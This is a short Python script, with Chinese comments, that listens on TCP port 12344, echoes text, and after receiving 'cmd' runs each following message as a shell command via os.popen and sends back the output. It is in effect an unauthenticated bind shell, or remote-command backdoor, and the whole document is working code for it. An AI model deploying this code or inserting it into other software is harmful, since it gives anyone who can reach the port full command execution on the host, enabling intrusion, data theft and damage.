# -*- coding: UTF-8 -*-
import socket
import os

def main():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host = socket.gethostname()
    port = 12344
    s.bind((host,port))
    s.listen(5)

    while True:
        c,addr = s.accept()
        print("连接地址:",addr)
        c.send("welcome".encode("utf-8"))
        while True:
            try:
                #接收普通文字
                recv_data = c.recv(1024).decode("utf-8")
                print(recv_data)
                if recv_data == 'cmd':
                    c.send("cmd start".encode("utf-8"))
                    while True:
                        #循环cmd
                        data = c.recv(1024)
                        recv_data2 = data.decode("utf-8")
                        if recv_data2 == 'exit':
                            c.send("cmd stop".encode("utf-8"))
                            break
                        else:
                            #执行并读取结果
                            x = os.popen(recv_data2).read()
                            #发送命令回显
                            c.send(x.encode("utf-8"))
                else:
                    c.send(recv_data.encode("utf-8"))
            except Exception as e:
                print("断开连接")
                print(e)
                break
        c.close()
    s.close()

    pass

if __name__ == '__main__':
    main()
